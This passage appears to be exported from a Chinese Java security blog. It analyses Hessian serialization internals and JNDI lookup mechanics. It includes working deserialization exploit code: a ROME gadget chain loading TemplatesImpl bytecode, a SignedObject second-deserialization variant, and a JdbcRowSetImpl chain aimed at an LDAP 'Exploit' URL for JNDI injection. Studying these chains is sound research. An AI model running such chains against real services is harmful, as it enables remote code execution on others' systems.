对象， resovler 对象就是设置好相应的代理工厂。 接着调用 create 方法创建接口代理类， 实例化了 HessianProxy 对象，该类实现了 InvocationHandler 接口，然后返回一个代理对象。最后调用代理对象的方法， System.out.println(hello.sayHello());这样就会调用到 HessianProxy.invoke 方法 然后对方法进行一些处理比较，最后把方法信息放入 _mangleMap sendRequest 方法 然后紧接着就调用 sendRequest 方法 跟进，首先通过 getConnectionFactory() 方法获得了负责连接的工厂类，然后调用这个类的 open 方法， 这个 open 方法是向指定的 URL 发送请求。 最后这个成功连接的 URLConnection 对象会被封装进 HessianURLConnection 对象中作为返回 然后回到 invoke 方法中，又调用了 addRequestHeaders 方法，该方法就是添加 header 头， 然后接着 call 方法将方法调用的信息写入流中， 最后调用 conn.sendRequest(); 发起请求，服务端从信息流中获得调用方法，最后进行远程调用并返回调用结果。 继续回到 invoke 方法，获取返回的 HessianURLConnection 对象的 input 流， readReply 方法 然后通过 readReply 方法来获得返回的结果， 跟进发现这里面调用了 readobject 方法， 继续跟进，看到在最后存在反序列化。 进入其中，根据返回类型来分别调用不同方法 最后返回结果。 ","date":"2025-03-06","objectID":"/posts/hessian/:3:1","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"服务端处理 com.caucho.hessian.server.HessianServlet 类是 javax.servlet.http.HttpServlet 的一个子类，其 service 方法是相关出处理起始位置，跟进 service 方法 看到会先判断是不是 POST 方法，如果满足条件会继续下面操作。这里会调用 HessianSkeleton#invoke 方法， 跟进，会根据获得 header 来选择混用模式， 然后调用到 invoke 方法， 在这里面会先反射调用接受到的要调用的方法 然后返回执行结果，最后会执行 writeReply 方法把返回结果进行序列化写入输出流中。 ","date":"2025-03-06","objectID":"/posts/hessian/:3:2","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"封装调用 除了结合 servlet 进行 web 远程调用外，还可以直接把关键序列化反序列化类提取出来进行封装，同样可以实现 hessian 的序列化和反序列化。 写个简单的 javabean 类 package org.example; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; private String telNumber; public Person() { } public Person(String name, int age, String telNumber) { this.name = name; this.age = age; this.telNumber = telNumber; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getTelNumber() { return telNumber; } public void setTelNumber(String telNumber) { this.telNumber = telNumber; } }然后进行序列化反序列化 package org.example; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.util.Base64; public class hessian_test { public static void main(String[] args) throws IOException { Person person = new Person(\"gaoren\",100,\"123\"); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); hessianOutput.writeObject(person); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()))); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); HessianInput hessianInput = new HessianInput(byteArrayInputStream); System.out.println(hessianInput.readObject()); } } ","date":"2025-03-06","objectID":"/posts/hessian/:3:3","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"Hessian 反序列化 ","date":"2025-03-06","objectID":"/posts/hessian/:4:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"Hessian1.0 源码分析 序列化 跟进 hessianOutput.writeObject，如果 serializer 对象为 null，会调用 _serializerFactory.getSerializer 来获取 serializer 对象 简单跟进看看，会先看 _cachedSerializerMap 是否为 null，如果为 null 就调用 loadSerializer 来进行获取 serializer 对象，然后把 serializer 对象加进 Map 缓存也就是 _cachedSerializerMap 中， 继续看看 loadSerializer 方法，调用 _contextFactory.getSerializer 方法，如果 serializer 还是 null 的话继续调用 factory.getCustomSerializer 如果还是为 null，就会对 class 进行类型判断返回相应的 serializer 对象 if (HessianRemoteObject.class.isAssignableFrom(cl)) { return new RemoteSerializer(); } else if (BurlapRemoteObject.class.isAssignableFrom(cl)) { return new RemoteSerializer(); } else if (InetAddress.class.isAssignableFrom(cl)) { return InetAddressSerializer.create(); } else if (JavaSerializer.getWriteReplace(cl) != null) { Serializer baseSerializer = getDefaultSerializer(cl); return new WriteReplaceSerializer(cl, getClassLoader(), baseSerializer); } else if (Map.class.isAssignableFrom(cl)) { if (_mapSerializer == null) _mapSerializer = new MapSerializer(); return _mapSerializer; } else if (Collection.class.isAssignableFrom(cl)) { if (_collectionSerializer == null) { _collectionSerializer = new CollectionSerializer(); } return _collectionSerializer; } else if (cl.isArray()) return new ArraySerializer(); else if (Throwable.class.isAssignableFrom(cl)) return new ThrowableSerializer(cl, getClassLoader()); else if (InputStream.class.isAssignableFrom(cl)) return new InputStreamSerializer(); else if (Iterator.class.isAssignableFrom(cl)) return IteratorSerializer.create(); else if (Calendar.class.isAssignableFrom(cl)) return CalendarSerializer.SER; else if (Enumeration.class.isAssignableFrom(cl)) return EnumerationSerializer.create(); else if (Enum.class.isAssignableFrom(cl)) return new EnumSerializer(cl); else if (Annotation.class.isAssignableFrom(cl)) return new AnnotationSerializer(cl); return getDefaultSerializer(cl); }对于自定义的对象就会走到 getDefaultSerializer 方法， 会先判断是否继承了 Serializable 接口以及 _isAllowNonSerializable 是否为 true，如果不满足条件就会抛出异常。满足后就会 UnsafeSerializer.create 方法， 跟进 UnsafeSerializer(cl)， 在 introspect 中就是将对象属性进行一个封装。 最后添加进 _serializerMap 中 最后回到 writeObject 方法，调用 serializer.writeObject 进行序列化。 一路跟进，调用到了 writeMapBegin 方法，将 M 设置为标识位， 最后调用 writeObject10 将对象属性写入字节流。 反序列化 同样先跟进 hessianInput.readObject() 方法，通过不同的标识位来选择 这里是 M ，继续跟进 调用了 getDeserializer 方法来获得 deserializer 对象， 还是会先看 Map 缓存中有没有， 没有继续调用 getDeserializer 方法 而在 getDeserializer 方法中又调用了 loadDeserializer 方法 这里就和序列化逻辑非常相似，先后调用 _contextFactory.getDeserializer 和 factory.getCustomDeserializer 两个方法来获得 deserializer 对象，如果还是为 null，那么就会对 cl 对象进行类型判断，返回相应的 deserializer 对象，自定义对象默认调用 getDefaultDeserializer 方法， if (Collection.class.isAssignableFrom(cl)) deserializer = new CollectionDeserializer(cl); else if (Map.class.isAssignableFrom(cl)) { deserializer = new MapDeserializer(cl); } else if (Iterator.class.isAssignableFrom(cl)) { deserializer = IteratorDeserializer.create(); } else if (Annotation.class.isAssignableFrom(cl)) { deserializer = new AnnotationDeserializer(cl); } else if (cl.isInterface()) { deserializer = new ObjectDeserializer(cl); } else if (cl.isArray()) { deserializer = new ArrayDeserializer(cl.getComponentType()); } else if (Enumeration.class.isAssignableFrom(cl)) { deserializer = EnumerationDeserializer.create(); } else if (Enum.class.isAssignableFrom(cl)) deserializer = new EnumDeserializer(cl); else if (Class.class.equals(cl)) deserializer = new ClassDeserializer(getClassLoader()); else deserializer = getDefaultDeserializer(cl); return deserializer; }在这里又会返回 UnsafeDeserializer 对象， 回到 readMap，继续调用 UnsafeDeserializer.readMap 方法 会调用到 allocateInstance 方法，该方法是还原对象 还原了对象后，继续调用 readMap 还原属性 其中调用 _unsafe.putObject 进行赋值， 最后返回 resolve ","date":"2025-03-06","objectID":"/posts/hessian/:4:1","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"Hessian2.0 源码分析 序列化 需要把上面代码中的 HessianOutput/HessianInput 换为 Hessian2Ouput/Hessian2Input 这两个类。 还是跟进 hessian2Output.writeObject 方法，然后跟进 getSerializer 方法，其实逻辑差不多，最后还是返回个 UnsafeSerializer 对象， 继续跟进 UnsafeSerializer.writeObject 方法， 同样会调用到 writeObjectBegin 方法，只不过不会继续调用 writeMapBegin 方法了，这里会把 C 作为标识位 然后继续调用 writeString 方法序列化对象，调用 writeDefinition20 序列化属性。 反序列化 跟进 hessian2Input.readObject()，调用 readObjectDefinition 方法， 又是 getObjectDeserializer 还是一路跟踪，来到 getDefaultDeserializer 方法， 最后就是返回一个 UnsafeDeserializer 还原对象， 剩下的其实就是上面一样的属性还原了。 ","date":"2025-03-06","objectID":"/posts/hessian/:4:2","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"Hessian 反序列化漏洞 这里的漏洞关键其实在 MapDeserializer#readMap 中 首先会创建一个Map对象，然后将 key 和 value 分别反序列化put进map中，而 HashMap#put 中可以触发到 key#hashcode， ","date":"2025-03-06","objectID":"/posts/hessian/:5:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"rome 链二次反序列化 Gadget hessianInput.readObject() MapDeserializer.readMap() map.put() ObjectBean.hashCode() ToStringBean.toString() SignedObject.getObject() ···常用的 rome 链就是可以通过 hashcode 进行触发，简单更改 poc 得到， package org.example; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.lang.reflect.Field; public class rometest { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); // setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); ToStringBean tobean = new ToStringBean(Templates.class,new HashMap\u003c\u003e()); ObjectBean bean = new ObjectBean(ToStringBean.class,tobean); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(bean,\"gaoren\"); Field v = tobean.getClass().getDeclaredField(\"_obj\"); v.setAccessible(true); v.set(tobean, tem); deserilize(serilize(hashmap)); } public static byte[] serilize(Object o) throws IOException { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); hessianOutput.writeObject(o); return byteArrayOutputStream.toByteArray(); } public static Object deserilize(byte[] bytes) throws IOException { ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); HessianInput hessianInput = new HessianInput(byteArrayInputStream); return hessianInput.readObject(); } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }但是运行报错 原因在 TemplatesImpl 中的 _tfactory 是一个 transient，无法参与序列化与反序列化，所以为 null，导致最后调用 TransletClassLoader 类实例化时报错， 因为在 TemplatesImpl 的 readobject 方法中会给 _tfactory 赋值，所以这里可以打二次反序列化， package org.example; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javax.xml.transform.Templates; import java.io.*; import java.nio.file.Files; import java.nio.file.Paths; import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.Signature; import java.security.SignedObject; import java.util.HashMap; import java.lang.reflect.Field; public class rometest { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); ToStringBean tobean = new ToStringBean(Templates.class,tem); ObjectBean bean = new ObjectBean(ToStringBean.class,tobean); HashMap\u003cObject,Object\u003e hashmap1 = new HashMap\u003c\u003e(); hashmap1.put(bean,\"gaoren\"); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashmap1, kp.getPrivate(), Signature.getInstance(\"DSA\")); ToStringBean tobean2 = new ToStringBean(SignedObject.class,new HashMap\u003c\u003e()); ObjectBean objectBean = new ObjectBean(ToStringBean.class,tobean2); HashMap hashmap2 = new HashMap(); hashmap2.put(objectBean, \"gaoren\"); Field v = tobean2.getClass().getDeclaredField(\"_obj\"); v.setAccessible(true); v.set(tobean2, signedObject); deserilize(serilize(hashmap2)); } public stat","date":"2025-03-06","objectID":"/posts/hessian/:5:1","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"rome+jdbcRowSetImpl Gadget hessianInput.readObject() MapDeserializer.readMap() hashmap.put() ObjectBean.hashCode() ToStringBean.toString() JdbcRowSetImpl.setautoCommit() JdbcRowSetImpl.connect() jndixxxx.lookup() ···JdbcRowSetImpl 可以打 jndi 注入，具体分析就不用说了， EXP import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ToStringBean; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.Serializable; import java.lang.reflect.Array; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; public class Main implements Serializable { public static void main(String[] args) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); String url = \"ldap://127.0.0.1:1389/Exploit\"; jdbcRowSet.setDataSourceName(url); ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); //手动生成HashMap，防止提前调用hashcode() HashMap hashMap = makeMap(equalsBean,\"114514\"); byte[] s = Hessian_serialize(hashMap); Hessian_unserialize(s); } //hessian依赖的序列化 public static byte[] Hessian_serialize(Object o) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(baos); hessianOutput.writeObject(o); hessianOutput.flush(); return baos.toByteArray(); } //hessian依赖的反序列化 public static Object Hessian_unserialize(byte[] bytes) throws IOException { ByteArrayInputStream bais = new ByteArrayInputStream(bytes); HessianInput hessianInput = new HessianInput(bais); Object o = hessianInput.readObject(); return o; } public static void setValue(Object obj, String name, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static HashMap\u003cObject, Object\u003e makeMap ( Object v1, Object v2 ) throws Exception { HashMap\u003cObject, Object\u003e s = new HashMap\u003c\u003e(); setValue(s, \"size\", 2); Class\u003c?\u003e nodeC; try { nodeC = Class.forName(\"java.util.HashMap$Node\"); } catch ( ClassNotFoundException e ) { nodeC = Class.forName(\"java.util.HashMap$Entry\"); } Constructor\u003c?\u003e nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null)); Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null)); setValue(s, \"table\", tbl); return s; } } ","date":"2025-03-06","objectID":"/posts/hessian/:5:2","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"总结 其实就是 heesian2 的 readobject 可以触发 hashmap.put 方法再里面可以触发 equales 和 hashcode 方法，还有一些其他链就懒得分析了，工具 marshalsec 也有具体利用链。 ","date":"2025-03-06","objectID":"/posts/hessian/:6:0","tags":["java","反序列化"],"title":"Hessian 反序列化","uri":"/posts/hessian/"},{"categories":["javasec"],"content":"jndi 全称 Java Naming Directory Interface，Java 命名和目录接口，是 SUN 公司提供的一种标准的 Java 命名系统接口。通过调用 JNDI 的 API 应用程序可以定位资源和其他程序对象。JNDI 可访问的现有目录及服务包括：JDBC（Java 数据库连接）、LDAP（轻型目录访问协议，ldap://）、RMI（远程方法调用，rmi://）、DNS（域名服务，dns://）、NIS（网络信息服务，一般 UNIX 使用,nis://）、CORBA（公共对象请求代理系统结构，iiop://） ","date":"2025-02-27","objectID":"/posts/java-jndi/:0:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"命名服务（Naming Server） 命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如 RMI 协议，可以通过名称来查找并调用具体的远程对象。又或者 DNS 协议，通过域名来查找具体的 IP 地址。这些都可以叫做命名服务。 在命名服务中，有几个重要的概念。 Bindings：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在 RMI 中远程对象绑定到对应的 name,文件系统中文件名绑定到对应的文件。 Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。 References：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:1:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"简单的 JNDI 示例 JNDI 接口主要分为下述 5 个包: javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类，（包括了 javax.naming.Context，javax.naming.InitialContext，分别是用于设置 jndi 环境变量和初始化上下文。） javax.naming.directory：主要用于目录操作，它定义了 DirContext 接口和 InitialDir-Context 类 javax.naming.event：在命名目录服务器中请求事件通知 javax.naming.ldap：提供 LDAP 服务支持 javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过 JNDI 可以访问相关服务 其中最重要的是 javax.naming 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 下面我们通过具体代码来看看 JNDI 是如何实现与各服务进行交互的。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:2:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI_RMI 首先在本地起一个 RMI 服务 定义一个 hello.java 接口 package org.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface hello extends Remote { public Object nihao() throws RemoteException,Exception; }然后创建 RMIobj.java，（这里直接把注册中心和服务端写在一起了） package org.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIobj extends UnicastRemoteObject implements hello { protected RMIobj() throws RemoteException { super(); } public void nihao() throws RemoteException, Exception { System.out.println(\"hello word\"); } private void registry() throws Exception{ hello rmiobj=new RMIobj(); LocateRegistry.createRegistry(1099); System.out.println(\"Server Start\"); Naming.bind(\"Hello\", rmiobj); } public static void main(String[] args) throws Exception { new RMIobj().registry(); } }然后通过 JNDI 接口调用远程类，JNDI_RMI package org.example; import javax.naming.Context; import javax.naming.InitialContext; import java.util.Hashtable; public class JNDI_RMI { public static void main(String[] args) throws Exception { //设置JNDI环境变量 Hashtable\u003cString, String\u003e env = new Hashtable\u003c\u003e(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); //可以不用设置，下面会说，会根据服务协议自行选择 env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); //初始化上下文 Context initialContext = new InitialContext(env); //调用远程类 hello ihello = (hello) initialContext.lookup(\"Hello\"); System.out.println(ihello.nihao()); } }成功调用， ","date":"2025-02-27","objectID":"/posts/java-jndi/:2:1","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI_DNS 以 JDK 内置的 DNS 目录服务为例 JNDI_DNS.java import javax.naming.Context; import javax.naming.NamingException; import javax.naming.directory.Attributes; import javax.naming.directory.DirContext; import javax.naming.directory.InitialDirContext; import java.util.Hashtable; public class JNDI_DNS { public static void main(String[] args) { Hashtable\u003cString,String\u003e env = new Hashtable\u003c\u003e(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.dns.DnsContextFactory\"); env.put(Context.PROVIDER_URL, \"dns://192.168.43.1\"); try { DirContext initialContext = new InitialDirContext(env); Attributes res = initialContext.getAttributes(\"goodapple.top\", new String[] {\"A\"}); System.out.println(res); } catch (NamingException e) { e.printStackTrace(); } } }~~我反正没有域名，没有尝试过。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:2:2","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI 的 Context 通过 JNDI 成功地调用了 RMI 和 DNS 服务。那么对于 JNDI 来讲，它是如何识别我们调用的是何种服务呢？这就依赖于我们上面提到的 Context（上下文）了。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:3:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"初始化 Context //设置JNDI环境变量 Hashtable\u003cString, String\u003e env = new Hashtable\u003c\u003e(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); //初始化上下文 Context initialContext = new InitialContext(env);使用 hashtable 来设置属性 INITIAL_CONTEXT_FACTORY 和 PROVIDER_URL，其中 JNDI 正式通过 INITIAL_CONTEXT_FACTORY 属性来识别调用的是何种服务，像这里就是 com.sun.jndi.rmi.registry.RegistryContextFactory。 接着属性 PROVIDER_URL 设置为了 \"rmi://localhost:1099\"，这正是我们 RMI 服务的地址。JNDI 通过该属性来获取服务的路径，进而调用该服务。 最后向 InitialContext 类传入我们设置的属性值来初始化一个 Context，于是我们就获得了一个与RMI服务相关联的上下文 Context。 当然，初始化Context的方法多种多样，我们来看一下 InitialContext 类的构造函数 //构建一个默认的初始上下文 public InitialContext(); //构造一个初始上下文，并选择不初始化它。 protected InitialContext(boolean lazy); //使用提供的环境变量初始化上下文。 public InitialContext(Hashtable\u003c?,?\u003e environment);所以我们还可以用如下方式来初始化一个 Context //设置JNDI环境变量 System.setProperty(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL,\"rmi://localhost:1099\"); //初始化上下文 InitialContext initialContext = new InitialContext();","date":"2025-02-27","objectID":"/posts/java-jndi/:3:1","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"通过 Context 与服务交互 和RMI类似，Context 同样通过以下五种方法来与被调用的服务进行交互 //将名称绑定到对象 bind(Name name, Object obj) //枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名 list(String name) //检索命名对象 lookup(String name) //将名称重绑定到对象 rebind(String name, Object obj) //取消绑定命名对象 unbind(String name) ","date":"2025-02-27","objectID":"/posts/java-jndi/:3:2","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI 底层实现 ","date":"2025-02-27","objectID":"/posts/java-jndi/:4:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"获取工厂类 我们通过 JNDI 来设置不同的上下文，就可以调用不同的服务。那么 JNDI 接口是如何实现这一功能的呢？ 在 InitalContext#InitalContext() 中，通过我们传入的 HashTable 进行 init。 继续跟进 跟到了 getInitialEnvironment 方法，继续跟进， 一路跟进到达 getInitialContext 方法。 这里首先通过 getInitialContextFactoryBuilder() 初始化了一个 InitialContextFactoryBuilder 类。 如果该类为空，则将 className 设置为 _INITIAL_CONTEXT_FACTORY_ 属性。这个属性就是我们手动设置的RMI上下文工厂类 com.sun.jndi.rmi.registry.RegistryContextFactory。 继续向下 这里通过 loadClass() 来动态加载我们设置的工厂类。然后提前学过 jndi 的知道后面会调用到工厂类的 getInitialContext() 方法也就是 RegistryContextFactory#getInitialContext() 方法，通过我们的设置工厂类来初始化上下文 Context。 现在我们知道了，JNDI是通过我们设置的 _INITIAL_CONTEXT_FACTORY_ 工厂类来判断将上下文初始化为何种类型，进而调用该类型上下文所对应的服务。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:4:1","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"获取服务交互所需资源 现在JNDI知道了我们想要调用何种服务，那么它又是如何知道服务地址以及获取服务的各种资源的呢？我们接着上文，跟到 RegistryContextFactory#getInitialContext() 中 这里的 var1 就是我们设置的两个环境变量，跟进 getInitCtxURL() JNDI通过我们设置的 _PROVIDER_URL_ 环境变量来获取服务的路径，接着在 URLToContext() 方法中初始化了一个 rmiURLContextFactory 类，并根据服务路径来获取实例。 跟到 rmiURLContextFactory#getUsingURL() 中 看到调用了 lookup() 方法。其实一直跟踪就知道调用的是 RegistryContext#lookup() ，根据上述过程中获取的信息初始化了一个新的 RegistryContext。 可见，在最终初始化的时候获取了一系列RMI通信过程中所需的资源，包括 RegistryImpl_Stub 类、path、port 等信息。如下图 JNDI 在初始化上下文的时候获取了与服务交互所需的各种资源，所以下一步就是通过获取的资源和服务愉快地进行交互了。 各种调用链如下 ","date":"2025-02-27","objectID":"/posts/java-jndi/:4:2","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI 动态协议转换*（看这个就行了） 其实除了上面那种写法，大部分是是如下 poc，那这种是怎么识别不同协议的工厂类的呢？下面简单分析一下。 import javax.naming.InitialContext; public class JNDI_Dynamic { public static void main(String[]args) throws Exception{ String string = \"rmi://localhost:1099/hello\"; InitialContext initialContext = new InitialContext(); IHello ihello = (IHello) initialContext.lookup(string); System.out.println(ihello.sayHello(\"Feng\")); } }首先从 lookup() 开始跟进，注意到其实我们不管调用的是lookup、bind或者是其他 initalContext 中的方法，都会调用 getURLOrDefaultInitCtx() 方法进行检查。 跟进 getURLOrDefaultInitCtx() 方法，会通过 getURLScheme() 方法来获取通信协议，比如这里获取到的是 rmi 协议，然后跟据获取到的协议，通过 NamingManager#getURLContext() 来调用 getURLObject() 方法 在 getURLObject 的时候会根据传入进来的 url 去寻找对应的工厂，比如这里的 rmi， 其实就是把 schema 和我们的 URLContextFactory 去拼接得到它的工厂，根据不同的工厂类对应着不同的 getObjectInstance 方法，并调用该方法 然后在 rmiURLContextFactory.getObjectInstance 中会返回个 rmiURLContext 对象， 一直回到 InitialContext.lookup 方法中，那么会调用 rmiURLContext.lookup 方法 但是 rmiURLContext 没有 lookup 方法，所以调用其父类 GenericURLContext (com.sun.jndi.toolkit.url) 的 lookup 方法，继续调用 RegistryResult.lookup 方法， 看到 return new RegistryContext(this); 其实就是上面自己设置属性进行上下文初始化最后的部分吗，继续会跟进到 decodeObject 方法 前面的不用管，直接看最后部分，如果符号这三个 if 条件就会抛出异常，而 jdk 高版本中默认 trustURLCodebase 为 false，然后如果 ref 是个远程类的话 ref.getFactoryClassLocation() 返回值就不为空了， 简单跟进看看 这个值是在 rmi 服务端设置的， 三个条件都满足最后就会抛出异常， 这里假设 trustURLCodebase 为 true ，继续跟进 NamingManaget.getObjectInstance 方法，调用了 getObjectFactoryFromReference(ref, f);， 在 getObjectFactoryFromReference(ref, f); 中会进行远程类加载，然后进行实列化触发 rce， 如果是后续的本地工厂类绕过会在 helper.loadClassWithoutInit(factoryName); 就获得 clas， 后面 clas 不为空也就不会进行远程加载而是直接返回 factory ，然后调用该 factory 的 getObjectInstance 方法， LDAP 的其实也差不多，只是中间过程肯定不是去调用 RegistryContext 的 lookup 方法，它从 lookup 会调用其他的 lookup 方法，但是最后一直跟进也会到达 DirectoryManager#getObjectInstance 方法，最后进行实列化。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:5:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI Reference 类 Reference 类表示对存在于命名/目录系统以外的对象的引用。比如远程获取 RMI 服务上的对象是 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。 当在本地找不到所调用的类时，我们可以通过 Reference 类来调用位于远程服务器的类。 Reference 类常用构造函数如下： //className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载 //factory为工厂类名 //factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议 Reference(String className, String factory, String factoryLocation) 在RMI中，由于我们远程加载的对象需要继承 UnicastRemoteObject 类，所以这里我们需要使用 ReferenceWrapper 类对 Reference 类或其子类对象进行远程包装成 Remote 类使其能够被远程访问。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:6:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI 注入 通过以上实例可以清晰的看到看到，如果 lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类 JNDI 接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示 JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下： 协议 JDK6 JDK7 JDK8 JDK11 LADP 6u211 以下 7u201 以下 8u191 以下 11.0.1 以下 